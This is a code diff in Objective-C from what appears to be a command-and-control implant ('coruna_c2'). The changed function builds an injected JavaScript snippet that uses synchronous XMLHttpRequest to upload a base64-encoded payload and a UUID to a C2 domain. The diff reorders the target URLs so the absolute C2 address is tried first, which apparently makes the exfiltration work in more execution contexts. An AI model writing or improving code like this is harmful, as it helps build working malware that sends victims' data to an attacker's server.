@@ -202,9 +202,9 @@ static void coruna_c2_store_diag(int32_t status, bool had_ctx, bool vm_tls) {
 }
 
 /*
- * Build sync XHR script: try location.origin+C2_UPLOAD, relative C2_UPLOAD, absolute
- * https?://C2_DOMAIN+C2_UPLOAD.  Returns last HTTP status, or -1 (no XHR), -2 (outer
- * exc), -3 (per-URL inner exc), -100 (eval nil), -101 (no toInt32).
+ * Build sync XHR script: try absolute URL first (works when location/document is
+ * not the page global), then location.origin+path, then relative.  Returns last
+ * HTTP status, or -1 (no XHR), -2 (outer exc), -3 (per-URL inner exc), …
  */
 static NSString *jsc_xhr_script(NSData *body, NSString *uuid) {
     NSString *b64body = [body base64EncodedStringWithOptions:0];
@@ -213,12 +213,12 @@ static NSString *jsc_xhr_script(NSData *body, NSString *uuid) {
     return [NSString stringWithFormat:
         @"(function(){"
         @"try{"
-        @"var g=(typeof window!=='undefined'?window:self);"
-        @"var X=g.XMLHttpRequest;if(!X)return-1;"
+        @"var g=(typeof window!=='undefined'?window:(typeof globalThis!=='undefined'?globalThis:self));"
+        @"var X=g&&g.XMLHttpRequest;if(!X)return-1;"
         @"var urls=[];"
+        @"urls.push('%@');"
         @"try{if(typeof location!=='undefined'&&location.origin)urls.push(location.origin+'%s');}catch(e){}"
         @"urls.push('%s');"
-        @"urls.push('%@');"
         @"var uuid='%@',raw=atob('%@');"
         @"var last=0;"
         @"for(var i=0;i<urls.length;i++){"
@@ -235,7 +235,7 @@ static NSString *jsc_xhr_script(NSData *body, NSString *uuid) {
         @"return last;"
         @"}catch(e){return-2;}"
         @"})();",
-        C2_UPLOAD, C2_UPLOAD, abs, uuid, b64body];
+        abs, C2_UPLOAD, C2_UPLOAD, uuid, b64body];
 }
 
 /* ObjC JSContext path (fallback when C API is inconclusive). */
